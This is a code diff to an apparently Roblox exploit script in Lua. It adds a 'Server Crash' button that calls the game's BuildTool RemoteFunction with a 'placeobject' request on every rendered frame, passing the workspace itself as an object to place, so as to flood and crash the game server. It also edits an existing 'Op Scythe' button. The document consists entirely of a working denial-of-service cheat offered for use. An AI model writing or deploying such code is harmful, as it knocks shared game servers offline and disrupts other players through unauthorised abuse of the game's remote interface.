@@ -426,8 +426,24 @@ local f = Section2:CreateButton("Op Scythe",function()
             }
             
             game:GetService("Players").LocalPlayer.Backpack.BuildTool.RemoteFunction:InvokeServer(unpack(args))
+            continue
         end
     end
 
 end)
 
+local cras = Section2:CreateButton("Server Crash", function()
+    local rs = game:GetService("RunService")
+
+    rs.RenderStepped:Connect(function()
+        local args = {
+            [1] = "placeobject",
+            [2] = {
+                [1] = workspace.Bases,
+                [2] = workspace
+            }
+        }
+        
+        game:GetService("Players").LocalPlayer.Backpack.BuildTool.RemoteFunction:InvokeServer(unpack(args))
+    end)
+end)
